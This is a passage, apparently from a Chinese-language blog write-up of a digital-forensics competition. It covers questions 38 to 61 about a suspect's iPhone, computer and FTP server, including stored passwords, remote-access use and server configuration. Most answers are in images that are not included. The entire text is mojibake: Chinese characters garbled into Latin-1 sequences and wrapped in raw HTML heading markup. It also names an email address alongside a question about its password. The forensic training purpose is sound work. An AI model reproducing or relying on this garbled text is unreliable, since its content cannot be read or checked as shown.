æœ‰å¯èƒ½æ˜¯ä»€ä¹ˆ" class="headerlink" title="38. é˜¿åŠ›å£«iPhone XRä¸­é˜¿åŠ›å£«çš„ç”µé‚®è´¦æˆ·Alexc19851016@gmail.comçš„å¯†ç æœ‰å¯èƒ½æ˜¯ä»€ä¹ˆ?"></a>38. é˜¿åŠ›å£«iPhone XRä¸­é˜¿åŠ›å£«çš„ç”µé‚®è´¦æˆ·Alexc19851016@gmail.comçš„å¯†ç æœ‰å¯èƒ½æ˜¯ä»€ä¹ˆ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/42.png" class="" title="alt text"><p>ç›´æ¥æœé‚®ç®±å°±å¯ä»¥æ‰¾åˆ°å¯†ç </p><h1 id="39-é˜¿åŠ›å£«iPhone-XRæ›¾ç»è¿æ¥Wifi-â€œAlex-Homeâ€çš„å¯†ç æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#39-é˜¿åŠ›å£«iPhone-XRæ›¾ç»è¿æ¥Wifi-â€œAlex-Homeâ€çš„å¯†ç æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="39. é˜¿åŠ›å£«iPhone XRæ›¾ç»è¿æ¥Wifi â€œAlex Homeâ€çš„å¯†ç æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>39. é˜¿åŠ›å£«iPhone XRæ›¾ç»è¿æ¥Wifi â€œAlex Homeâ€çš„å¯†ç æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/43.png" class="" title="alt text"><p>123456</p><h1 id="40-é˜¿åŠ›å£«iPhone-XRç»iCloudå¤‡ä»½çš„æœ€åæ—¶é—´æ˜¯ä»€ä¹ˆ-UTC-8"><a href="#40-é˜¿åŠ›å£«iPhone-XRç»iCloudå¤‡ä»½çš„æœ€åæ—¶é—´æ˜¯ä»€ä¹ˆ-UTC-8" class="headerlink" title="40.é˜¿åŠ›å£«iPhone XRç»iCloudå¤‡ä»½çš„æœ€åæ—¶é—´æ˜¯ä»€ä¹ˆ?(UTC+8)?"></a>40.é˜¿åŠ›å£«iPhone XRç»iCloudå¤‡ä»½çš„æœ€åæ—¶é—´æ˜¯ä»€ä¹ˆ?(UTC+8)?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/44.png" class="" title="alt text"><p>çœ‹è®¾å¤‡ä¿¡æ¯å¯ä»¥çœ‹åˆ°äº‘å¤‡ä»½æ—¶é—´</p><h1 id="41-é˜¿åŠ›å£«iPhone-XRä¸­çš„iBootç‰ˆæœ¬æ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è½®å…¥â€-â€"><a href="#41-é˜¿åŠ›å£«iPhone-XRä¸­çš„iBootç‰ˆæœ¬æ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è½®å…¥â€-â€" class="headerlink" title="41.é˜¿åŠ›å£«iPhone XRä¸­çš„iBootç‰ˆæœ¬æ˜¯ (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è½®å…¥â€.â€)"></a>41.é˜¿åŠ›å£«iPhone XRä¸­çš„iBootç‰ˆæœ¬æ˜¯ (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è½®å…¥â€.â€)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/45.png" class="" title="alt text"><p>æŸ¥çœ‹phoneinfoæ–‡ä»¶</p><h1 id="42-é˜¿åŠ›å£«iPhone-XRä¸­çš„WhatsAppç¾¤ç»„ã€å›¢è´­-æ–°é²œçŒªè‚‰ç‰›è‚‰-ä¸œæ¶Œç¾¤ç»„-9-30ã€æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªæˆå‘˜"><a href="#42-é˜¿åŠ›å£«iPhone-XRä¸­çš„WhatsAppç¾¤ç»„ã€å›¢è´­-æ–°é²œçŒªè‚‰ç‰›è‚‰-ä¸œæ¶Œç¾¤ç»„-9-30ã€æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªæˆå‘˜" class="headerlink" title="42.é˜¿åŠ›å£«iPhone XRä¸­çš„WhatsAppç¾¤ç»„ã€å›¢è´­-æ–°é²œçŒªè‚‰ç‰›è‚‰-ä¸œæ¶Œç¾¤ç»„-9/30ã€æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªæˆå‘˜?"></a>42.é˜¿åŠ›å£«iPhone XRä¸­çš„WhatsAppç¾¤ç»„ã€å›¢è´­-æ–°é²œçŒªè‚‰ç‰›è‚‰-ä¸œæ¶Œç¾¤ç»„-9/30ã€æœ‰ä»¥ä¸‹å“ªä¸€ä¸ªæˆå‘˜?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/46.png" class="" title="alt text"><h1 id="43-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºæ›¾äºhongkongcard-com-çš„è®ºå›ç™»è®°æˆä¸ºä¼šå‘˜ï¼Œä»¥ä¸‹å“ªä¸ªæ˜¯ä»–çš„å¸æˆ·å¯†ç "><a href="#43-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºæ›¾äºhongkongcard-com-çš„è®ºå›ç™»è®°æˆä¸ºä¼šå‘˜ï¼Œä»¥ä¸‹å“ªä¸ªæ˜¯ä»–çš„å¸æˆ·å¯†ç " class="headerlink" title="43.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºæ›¾äºhongkongcard.com çš„è®ºå›ç™»è®°æˆä¸ºä¼šå‘˜ï¼Œä»¥ä¸‹å“ªä¸ªæ˜¯ä»–çš„å¸æˆ·å¯†ç ?"></a>43.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºæ›¾äºhongkongcard.com çš„è®ºå›ç™»è®°æˆä¸ºä¼šå‘˜ï¼Œä»¥ä¸‹å“ªä¸ªæ˜¯ä»–çš„å¸æˆ·å¯†ç ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/47.png" class="" title="alt text"><p>å¯ä»¥å‘ç°ä¸ºè°·æ­Œè´¦å·ï¼Œæˆ‘ä»¬åœ¨38é¢˜é‡Œæœ‰æ‰¾åˆ°å¯†ç </p><h1 id="44-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºé˜¿åŠ›å£«æ›¾ç”¨ä»€ä¹ˆæ–¹æ³•è¿›å…¥å—å®³è€…-ä¸»ç®¡-çš„è®¡ç®—æœº"><a href="#44-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºé˜¿åŠ›å£«æ›¾ç”¨ä»€ä¹ˆæ–¹æ³•è¿›å…¥å—å®³è€…-ä¸»ç®¡-çš„è®¡ç®—æœº" class="headerlink" title="44.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºé˜¿åŠ›å£«æ›¾ç”¨ä»€ä¹ˆæ–¹æ³•è¿›å…¥å—å®³è€…(ä¸»ç®¡)çš„è®¡ç®—æœº?"></a>44.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºé˜¿åŠ›å£«æ›¾ç”¨ä»€ä¹ˆæ–¹æ³•è¿›å…¥å—å®³è€…(ä¸»ç®¡)çš„è®¡ç®—æœº?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/48.png" class="" title="alt text"><p>ç”¨çš„æ˜¯è¿œæ§è½¯ä»¶</p><h1 id="45-ç»­ä¸Šé¢˜ï¼Œé˜¿åŠ›å£«æœ€åä¸€æ¬¡è¿›å…¥å—å®³è€…-ä¸»ç®¡-è®¡ç®—æœºçš„æ—¶é—´æ˜¯ä»€ä¹ˆ"><a href="#45-ç»­ä¸Šé¢˜ï¼Œé˜¿åŠ›å£«æœ€åä¸€æ¬¡è¿›å…¥å—å®³è€…-ä¸»ç®¡-è®¡ç®—æœºçš„æ—¶é—´æ˜¯ä»€ä¹ˆ" class="headerlink" title="45.ç»­ä¸Šé¢˜ï¼Œé˜¿åŠ›å£«æœ€åä¸€æ¬¡è¿›å…¥å—å®³è€…(ä¸»ç®¡)è®¡ç®—æœºçš„æ—¶é—´æ˜¯ä»€ä¹ˆ?"></a>45.ç»­ä¸Šé¢˜ï¼Œé˜¿åŠ›å£«æœ€åä¸€æ¬¡è¿›å…¥å—å®³è€…(ä¸»ç®¡)è®¡ç®—æœºçš„æ—¶é—´æ˜¯ä»€ä¹ˆ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/48.png" class="" title="alt text"><p>è¿œæ§è®°å½•å¯ä»¥çœ‹åˆ°æ—¶é—´</p><h1 id="46-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºä»–æ›¾ç»ä½¿ç”¨FTPç¨‹åºï¼ŒFTPçš„ä¸»æœºIPåœ°å€æ˜¯ä»€éº¼-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·"><a href="#46-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºä»–æ›¾ç»ä½¿ç”¨FTPç¨‹åºï¼ŒFTPçš„ä¸»æœºIPåœ°å€æ˜¯ä»€éº¼-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·" class="headerlink" title="46.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºä»–æ›¾ç»ä½¿ç”¨FTPç¨‹åºï¼ŒFTPçš„ä¸»æœºIPåœ°å€æ˜¯ä»€éº¼?(è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)"></a>46.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºä»–æ›¾ç»ä½¿ç”¨FTPç¨‹åºï¼ŒFTPçš„ä¸»æœºIPåœ°å€æ˜¯ä»€éº¼?(è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/49.png" class="" title="alt text"><h1 id="47-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºäº2021å¹´9æœˆè‡³2021å¹´11æœˆæœŸé—´ï¼Œè®¡ç®—æœºæ›¾è¢«ç™»å…¥è¿‡å¤šå°‘æ¬¡-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#47-é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºäº2021å¹´9æœˆè‡³2021å¹´11æœˆæœŸé—´ï¼Œè®¡ç®—æœºæ›¾è¢«ç™»å…¥è¿‡å¤šå°‘æ¬¡-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="47.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºäº2021å¹´9æœˆè‡³2021å¹´11æœˆæœŸé—´ï¼Œè®¡ç®—æœºæ›¾è¢«ç™»å…¥è¿‡å¤šå°‘æ¬¡? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>47.é˜¿åŠ›å£«çš„è®¡ç®—æœºæ˜¾ç¤ºäº2021å¹´9æœˆè‡³2021å¹´11æœˆæœŸé—´ï¼Œè®¡ç®—æœºæ›¾è¢«ç™»å…¥è¿‡å¤šå°‘æ¬¡? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/kog.png" class="" title="alt text"><h1 id="48-é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft-Office-2007-æ˜¯ä»¥ä¸‹å“ªä¸€ä¸ªç‰ˆæœ¬-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·"><a href="#48-é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft-Office-2007-æ˜¯ä»¥ä¸‹å“ªä¸€ä¸ªç‰ˆæœ¬-è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€-â€ç¬¦å·" class="headerlink" title="48.é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft Office 2007 æ˜¯ä»¥ä¸‹å“ªä¸€ä¸ªç‰ˆæœ¬? (è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)"></a>48.é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft Office 2007 æ˜¯ä»¥ä¸‹å“ªä¸€ä¸ªç‰ˆæœ¬? (è¯·ä»¥äºšæ‹‰ä¼¯æ•°å­—ä½œç­”ï¼Œçœå»â€.â€ç¬¦å·)</h1><p>ä»¿çœŸåå†è½¯ä»¶ä¸­æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥å†æ§åˆ¶é¢æ¿äº†æŸ¥çœ‹<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/50.png" class="" title="alt text"></p><h1 id="49-ä»¥ä¸‹æ˜¯é˜¿åŠ›å£«è®¡ç®—æœºä¸­çš„Basic-data-partition-EFI-3-çš„Volume-ID-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#49-ä»¥ä¸‹æ˜¯é˜¿åŠ›å£«è®¡ç®—æœºä¸­çš„Basic-data-partition-EFI-3-çš„Volume-ID-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="49.ä»¥ä¸‹æ˜¯é˜¿åŠ›å£«è®¡ç®—æœºä¸­çš„Basic data partition (EFI 3) çš„Volume ID?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>49.ä»¥ä¸‹æ˜¯é˜¿åŠ›å£«è®¡ç®—æœºä¸­çš„Basic data partition (EFI 3) çš„Volume ID?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><p>Volumeå·IDï¼Œæˆ‘ä»¬å°†é•œåƒæŒ‚è½½åˆ°Eç›˜ï¼Œå¦‚ä½•å†ä½¿ç”¨DiskGeniusæ‰“å¼€æŸ¥çœ‹ID<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/51.png" class="" title="alt text"></p><h1 id="50-é˜¿åŠ›å£«è®¡ç®—æœºçš„Window-product-IDæ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ"><a href="#50-é˜¿åŠ›å£«è®¡ç®—æœºçš„Window-product-IDæ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ" class="headerlink" title="50.é˜¿åŠ›å£«è®¡ç®—æœºçš„Window product IDæ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)"></a>50.é˜¿åŠ›å£«è®¡ç®—æœºçš„Window product IDæ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/52.png" class="" title="alt text"><p>äº§å“ID</p><h1 id="51-é˜¿åŠ›å£«è®¡ç®—æœºæ›¾ç»ä¸‹è½½ä¸€å¼ çŒ´å­çš„å›¾ç‰‡ï¼Œä»¥ä¸‹å“ªä¸€é¡¹æè¿°æ­£ç¡®"><a href="#51-é˜¿åŠ›å£«è®¡ç®—æœºæ›¾ç»ä¸‹è½½ä¸€å¼ çŒ´å­çš„å›¾ç‰‡ï¼Œä»¥ä¸‹å“ªä¸€é¡¹æè¿°æ­£ç¡®" class="headerlink" title="51.é˜¿åŠ›å£«è®¡ç®—æœºæ›¾ç»ä¸‹è½½ä¸€å¼ çŒ´å­çš„å›¾ç‰‡ï¼Œä»¥ä¸‹å“ªä¸€é¡¹æè¿°æ­£ç¡®?"></a>51.é˜¿åŠ›å£«è®¡ç®—æœºæ›¾ç»ä¸‹è½½ä¸€å¼ çŒ´å­çš„å›¾ç‰‡ï¼Œä»¥ä¸‹å“ªä¸€é¡¹æè¿°æ­£ç¡®?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/53.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/54.png" class="" title="alt text"><p>å†æµè§ˆå™¨çš„ä¸‹è½½è®°å½•é‡Œå¯ä»¥æ‰¾åˆ°ä¸‹è½½äº†ä¸€äº›å›¾ç‰‡ï¼Œæ‰“å¼€å‘ç°image(1)æ˜¯çŒ´å­</p><h1 id="52-é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft-Office-2007-çš„å¯†é’¥æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ"><a href="#52-é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft-Office-2007-çš„å¯†é’¥æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ" class="headerlink" title="52.é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft Office 2007 çš„å¯†é’¥æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)"></a>52.é˜¿åŠ›å£«è®¡ç®—æœºæ‰€å®‰è£…çš„Microsoft Office 2007 çš„å¯†é’¥æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/55.png" class="" title="alt text"><p>ä»¿çœŸæ‰“å¼€æ¡Œé¢çš„Microsoft æ–‡ä»¶å¤¹é‡Œé¢æœ‰key</p><h1 id="53-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…äº†ç”šä¹ˆç¨‹åº"><a href="#53-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…äº†ç”šä¹ˆç¨‹åº" class="headerlink" title="53.é˜¿åŠ›å£«FTP æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…äº†ç”šä¹ˆç¨‹åº?"></a>53.é˜¿åŠ›å£«FTP æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨å‘½ä»¤è¡Œå®‰è£…äº†ç”šä¹ˆç¨‹åº?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/dd.png" class="" title="alt text"><p>ä¸‹è½½äº†docker</p><h1 id="54-ä»¥ä¸‹å“ªäº›æ¡£æ¡ˆäºé˜¿åŠ›å£«FTP-æœåŠ¡å™¨æ›¾é‡å¤å‡ºç°"><a href="#54-ä»¥ä¸‹å“ªäº›æ¡£æ¡ˆäºé˜¿åŠ›å£«FTP-æœåŠ¡å™¨æ›¾é‡å¤å‡ºç°" class="headerlink" title="54.ä»¥ä¸‹å“ªäº›æ¡£æ¡ˆäºé˜¿åŠ›å£«FTP æœåŠ¡å™¨æ›¾é‡å¤å‡ºç°?"></a>54.ä»¥ä¸‹å“ªäº›æ¡£æ¡ˆäºé˜¿åŠ›å£«FTP æœåŠ¡å™¨æ›¾é‡å¤å‡ºç°?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/56.png" class="" title="alt text"><p>ä¸€ä¸ªä¸ªæœèƒ½æœå‡ºç­”æ¡ˆ</p><h1 id="55-åœ¨é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä¸­ï¼Œæ–‡ä»¶å¤¹-æ›¾è¢«ç”¨æˆ·å˜æ›´äº†è®¿é—®æƒé™-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#55-åœ¨é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä¸­ï¼Œæ–‡ä»¶å¤¹-æ›¾è¢«ç”¨æˆ·å˜æ›´äº†è®¿é—®æƒé™-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="55.åœ¨é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä¸­ï¼Œæ–‡ä»¶å¤¹_æ›¾è¢«ç”¨æˆ·å˜æ›´äº†è®¿é—®æƒé™(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>55.åœ¨é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä¸­ï¼Œæ–‡ä»¶å¤¹<em>_</em>æ›¾è¢«ç”¨æˆ·å˜æ›´äº†è®¿é—®æƒé™(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/57.png" class="" title="alt text"><h1 id="56-åœ¨é˜¿åŠ›å£«FTP-æœåŠ¡å™¨å»ºè®¾åï¼Œæœ‰-ä¸ªé¢å¤–ç”¨æˆ·è¢«åŠ å…¥-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#56-åœ¨é˜¿åŠ›å£«FTP-æœåŠ¡å™¨å»ºè®¾åï¼Œæœ‰-ä¸ªé¢å¤–ç”¨æˆ·è¢«åŠ å…¥-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="56.åœ¨é˜¿åŠ›å£«FTP æœåŠ¡å™¨å»ºè®¾åï¼Œæœ‰ _ ä¸ªé¢å¤–ç”¨æˆ·è¢«åŠ å…¥ (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>56.åœ¨é˜¿åŠ›å£«FTP æœåŠ¡å™¨å»ºè®¾åï¼Œæœ‰ <em>_</em> ä¸ªé¢å¤–ç”¨æˆ·è¢«åŠ å…¥ (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/58.png" class="" title="alt text"><p>åŠ å…¥äº†wai</p><h1 id="57-æ ¹æ®é˜¿åŠ›å£«FTPæœåŠ¡å™¨è®¾å®šæ˜¾ç¤ºï¼Œæ­¤æœåŠ¡å™¨æ˜¯ä»¥æ–¹å¼è¿æ¥ç½‘ç»œï¼Œä¸”æ˜¯ä¸€ä¸ªç½‘ç»œçŠ¶æ€"><a href="#57-æ ¹æ®é˜¿åŠ›å£«FTPæœåŠ¡å™¨è®¾å®šæ˜¾ç¤ºï¼Œæ­¤æœåŠ¡å™¨æ˜¯ä»¥æ–¹å¼è¿æ¥ç½‘ç»œï¼Œä¸”æ˜¯ä¸€ä¸ªç½‘ç»œçŠ¶æ€" class="headerlink" title="57.æ ¹æ®é˜¿åŠ›å£«FTPæœåŠ¡å™¨è®¾å®šæ˜¾ç¤ºï¼Œæ­¤æœåŠ¡å™¨æ˜¯ä»¥æ–¹å¼è¿æ¥ç½‘ç»œï¼Œä¸”æ˜¯ä¸€ä¸ªç½‘ç»œçŠ¶æ€"></a>57.æ ¹æ®é˜¿åŠ›å£«FTPæœåŠ¡å™¨è®¾å®šæ˜¾ç¤ºï¼Œæ­¤æœåŠ¡å™¨æ˜¯ä»¥<strong><em>æ–¹å¼è¿æ¥ç½‘ç»œï¼Œä¸”æ˜¯ä¸€ä¸ª</em></strong>ç½‘ç»œçŠ¶æ€</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/59.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/60.png" class="" title="alt text"><h1 id="58-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨è®¾å®šæœ€å¤šä½¿ç”¨è€…æ•°ç›®æ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#58-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨è®¾å®šæœ€å¤šä½¿ç”¨è€…æ•°ç›®æ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="58.é˜¿åŠ›å£«FTP æœåŠ¡å™¨è®¾å®šæœ€å¤šä½¿ç”¨è€…æ•°ç›®æ˜¯ _ (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>58.é˜¿åŠ›å£«FTP æœåŠ¡å™¨è®¾å®šæœ€å¤šä½¿ç”¨è€…æ•°ç›®æ˜¯ <em>_</em> (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/61.png" class="" title="alt text"><p>50ä¸ª</p><h1 id="59-é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä½¿ç”¨Dockerå®‰è£…äº†ä¸€ä¸ªFTPç¨‹åºä¸º-ã€‚-ä¾‹å¦‚-space-docker-1-1ï¼Œè¯·è¾“å…¥spacedocker-1-1ï¼Œä¸è¦è¾“å…¥ç©ºæ ¼"><a href="#59-é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä½¿ç”¨Dockerå®‰è£…äº†ä¸€ä¸ªFTPç¨‹åºä¸º-ã€‚-ä¾‹å¦‚-space-docker-1-1ï¼Œè¯·è¾“å…¥spacedocker-1-1ï¼Œä¸è¦è¾“å…¥ç©ºæ ¼" class="headerlink" title="59.é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä½¿ç”¨Dockerå®‰è£…äº†ä¸€ä¸ªFTPç¨‹åºä¸º_ã€‚(ä¾‹å¦‚ space docker/1.1ï¼Œè¯·è¾“å…¥spacedocker/1.1ï¼Œä¸è¦è¾“å…¥ç©ºæ ¼)"></a>59.é˜¿åŠ›å£«FTPæœåŠ¡å™¨ä½¿ç”¨Dockerå®‰è£…äº†ä¸€ä¸ªFTPç¨‹åºä¸º<em>_</em>ã€‚(ä¾‹å¦‚ space docker/1.1ï¼Œè¯·è¾“å…¥spacedocker/1.1ï¼Œä¸è¦è¾“å…¥ç©ºæ ¼)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/62.png" class="" title="alt text"><h1 id="60-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨æ›¾ä½¿ç”¨è¿‡ç”šä¹ˆç‰ˆæœ¬çš„Linuxå†…æ ¸"><a href="#60-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨æ›¾ä½¿ç”¨è¿‡ç”šä¹ˆç‰ˆæœ¬çš„Linuxå†…æ ¸" class="headerlink" title="60.é˜¿åŠ›å£«FTP æœåŠ¡å™¨æ›¾ä½¿ç”¨è¿‡ç”šä¹ˆç‰ˆæœ¬çš„Linuxå†…æ ¸?"></a>60.é˜¿åŠ›å£«FTP æœåŠ¡å™¨æ›¾ä½¿ç”¨è¿‡ç”šä¹ˆç‰ˆæœ¬çš„Linuxå†…æ ¸?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/63.png" class="" title="alt text"><h1 id="61-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨çš„ç£ç›˜åˆ†åŒºï¼Œæœ‰ä»¥ä¸‹å“ªä¸€ç§æ–‡ä»¶ç³»ç»Ÿ"><a href="#61-é˜¿åŠ›å£«FTP-æœåŠ¡å™¨çš„ç£ç›˜åˆ†åŒºï¼Œæœ‰ä»¥ä¸‹å“ªä¸€ç§æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="61.é˜¿åŠ›å£«FTP 